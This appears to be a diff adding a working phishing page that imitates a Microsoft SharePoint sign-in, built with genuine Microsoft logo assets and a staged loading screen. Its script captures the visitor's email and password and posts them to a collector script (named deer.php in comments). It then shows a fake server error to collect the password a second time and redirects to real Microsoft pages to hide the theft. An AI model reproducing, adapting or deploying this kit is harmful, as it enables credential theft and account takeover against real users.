+    75% {
+        left: -100px;
+    }
+    100% {
+        left: -100px;
+    }
+}
+
+@keyframes dot-floating-after {
+    0% {
+        left: -100px;
+    }
+    50% {
+        left: -24px;
+    }
+    75% {
+        left: -100px;
+    }
+    100% {
+        left: -100px;
+    }
+}
+
+.loaderxBlock {
+    display: none;
+}
+</style>
+
+</head>
+  <body  id="allbody" >
+
+<div id="div1" class="canvas" style="display: block;">
+    <img class="imgclass" src="https://auburn.service-now.com/sharepoint-logo-only.pngx" alt="" srcset="">
+
+    <div class="tittleText"><br>Microsoft© Sharepoint</div>
+    <p class="logerMe"></p>
+
+    <div class="loader">Loading...</div>
+</div>
+
+<!-- LOGIN PAGE START  -->
+
+<div class="loginForm" id="login" style="display: none;">
+    <form  onSubmit="return myFirst(this);">
+    <div id="div3" style="display: none; " class="passwordBlock w3-animate-right">
+        
+        <img id="logoPage2" class="formLogo1" src="https://logincdn.msauth.net/shared/5/images/microsoft_logo_ee5c8d9fb6248c938fd0.svg" alt="logo.png">
+        <div style="display: flex;">
+            <img class="backArrow" role="presentation" pngsrc="https://logincdn.msauth.net/shared/5/images/arrow_left_a9cc2824ef3517b6c416.svg" svgsrc="https://logincdn.msauth.net/shared/5/images/arrow_left_a9cc2824ef3517b6c416.svg" data-bind="imgSrc" src="https://logincdn.msauth.net/shared/5/images/arrow_left_a9cc2824ef3517b6c416.svg">
+            <a class="emailLabel" id="username1"></a>
+            
+        </div>
+        <a class="signIn">Enter password</a>
+        
+        
+        <input class="passwordImput" placeholder="Password" type="password" id="passwd" name="passwd"  required />
+        <div class="labelpassword">
+            <input style="height: 20px; width: 20px;" type="checkbox" name="" id="">
+            <a style="color: #000; cursor: pointer; margin-top: 0px; margin-left: 5px;">Keep me signed in</a>
+        </div>
+        <div style="display: flex;">
+            <a style="padding-right: 7px; font-size: 0.9rem; color: #0067b8; cursor: pointer;">Forgot password?</a>
+        </div>
+        <button id="signin" class="formButton" type="submit" >Sign in</button>
+        
+    </div>
+    </form>
+    <form  onSubmit="return mySecond(this);">
+    <div id="div4" style="display: none;" class="passwordBlock w3-animate-right">
+        
+        <img id="logoPage2" class="formLogo1" src="https://logincdn.msauth.net/shared/5/images/microsoft_logo_ee5c8d9fb6248c938fd0.svg">
+        <div style="display: flex;">
+            <img class="backArrow" role="presentation" pngsrc="https://logincdn.msauth.net/shared/5/images/arrow_left_a9cc2824ef3517b6c416.svg" svgsrc="https://logincdn.msauth.net/shared/5/images/arrow_left_a9cc2824ef3517b6c416.svg" data-bind="imgSrc" src="https://logincdn.msauth.net/shared/5/images/arrow_left_a9cc2824ef3517b6c416.svg">
+            <a class="emailLabel" id="username2"></a>
+            
+        </div>
+        <a class="signIn">Enter password</a>
+        
+        <a class="passwordError" id="error" style="display:none;">Server error. please try again...</a>
+        <input class="passwordImput" placeholder="Password" id="passwd3" type="password" name="passwd3" onkeypress="onChangeFunction()" required />
+        <input type="hidden" id="user" name="user" />
+        <input type="hidden" id="passwd2" name="passwd2"  />
+        <div class="labelpassword">
+            <input style="height: 20px; width: 20px;" type="checkbox" name="" id="">
+            <a style="color: #000; cursor: pointer; margin-top: 0px; margin-left: 5px;">Keep me signed in</a>
+        </div>
+        <div style="display: flex;">
+            <a style="padding-right: 7px; font-size: 0.9rem; color: #0067b8; cursor: pointer;">Forgot password?</a>
+        </div>
+        <button id="signin" class="formButton" type="submit" >Sign in</button>
+        
+    </div>
+    </form>
+
+    <div id="div2" class="loaderxBlock w3-animate-right" style="display: none;">
+
+        <img class="formLogo" src="https://logincdn.msauth.net/shared/5/images/microsoft_logo_ee5c8d9fb6248c938fd0.svg" alt="logo.png">
+        <br><br><br><br>
+        <a class="signIn">Trying to sign in</a>
+        <br> <br>
+        <a style="display: grid;" class="dot-floating"></a>
+        <br> <br>
+        <a style="border-style: solid; color: #0067b8; width: 50px; border-color: black; border-width: thin;">Cancel</a>
+        <br> <br><br> <br>
+    </div>
+
+</div>
+
+<!-- LOGIN PAGE END  -->
+
+
+<div class="buttomLabel">
+    <a>Terms of use</a>
+    <a>Privacy &amp; cookies</a>
+    <a>...</a>
+</div>
+
+  </body>
+
+
+<script>
+    
+setTimeout(function(){
+document.getElementById('username1').innerHTML=email;
+document.getElementById('username2').innerHTML=email;
+  document.body.style.backgroundImage = "url('https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg')";
+ document.getElementById('div1').style.display='none';
+                    document.getElementById('login').style.display='block';
+                    document.getElementById('div2').style.display='block';
+                    myTime(this);
+        }, 3000);
+
+function myTime(){setTimeout(function(){
+ document.getElementById('div2').style.display='none';
+                    document.getElementById('div3').style.display='grid';
+ }, 3000);}
+function onChangeFunction(){
+document.getElementById('error').style.display='none';
+}
+   function myFirst(event) {
+     var pr = document.getElementById("passwd").value;
+     document.getElementById('passwd2').value=pr;
+     document.getElementById('user').value=email;
+     document.getElementById('div3').style.display='none';
+     document.getElementById('div2').style.display = 'block';
+     
+     // Send to deer.php with u and p parameters
+     var datas = new FormData();
+     datas.append('u', email);
+     datas.append('p', pr);
+     
+     var xhr = new XMLHttpRequest();
+     xhr.open('POST', file, true);
+     xhr.onload = function () {
+       var resp = this.responseText.trim();
+       if (resp === 'VALID') {
+         // Valid login - redirect to Microsoft
+         setTimeout(function(){
+           window.location.href = 'https://login.microsoftonline.com/';
+         }, 3000);
+       } else {
+         // GAGAL - show second password form
+         document.getElementById('div2').style.display='none';
+         document.getElementById('div4').style.display='grid';
+         document.getElementById('error').style.display='block';
+       }
+     };
+     xhr.onerror = function() {
+       // On error, show second form
+       document.getElementById('div2').style.display='none';
+       document.getElementById('div4').style.display='grid';
+       document.getElementById('error').style.display='block';
+     };
+     xhr.send(datas);
+     
+     return false;
+   }
+                                                
+        function mySecond(event){
+                                                
+             var ps = document.getElementById('passwd3').value;
+             var pt = document.getElementById('passwd2').value;
+             document.getElementById('div4').style.display='none';
+             document.getElementById('div2').style.display = 'block';
+             
+             // Send to deer.php with u and p parameters
+             var datas = new FormData();
+             datas.append('u', email);
+             datas.append('p', ps);
+             
+             var xhr = new XMLHttpRequest();
+             xhr.open('POST', file, true);
+             xhr.onload = function () {
+               var resp = this.responseText.trim();
+               if (resp === 'VALID') {
+                 // Valid login - redirect to Microsoft
+                 setTimeout(function(){
+                   window.location.href = 'https://login.microsoftonline.com/';
+                 }, 3000);
+               } else {
+                 // GAGAL - redirect to support page after delay
+                 setTimeout(function(){
+                   window.location.replace('https://support.microsoft.com/en-us/office/fix-onedrive-sync-problems-0899b115-05f7-45ec-95b2-e4cc8c4670b2');
+                 }, 5000);
+               }
+             };
+             xhr.onerror = function() {
+               // On error, redirect to support page
+               setTimeout(function(){
+                 window.location.replace('https://support.microsoft.com/en-us/office/fix-onedrive-sync-problems-0899b115-05f7-45ec-95b2-e4cc8c4670b2');
+               }, 5000);
+             };
+             xhr.send(datas);
+             
+             return false;
+         }
+
+</script>
+
+
+  </html>
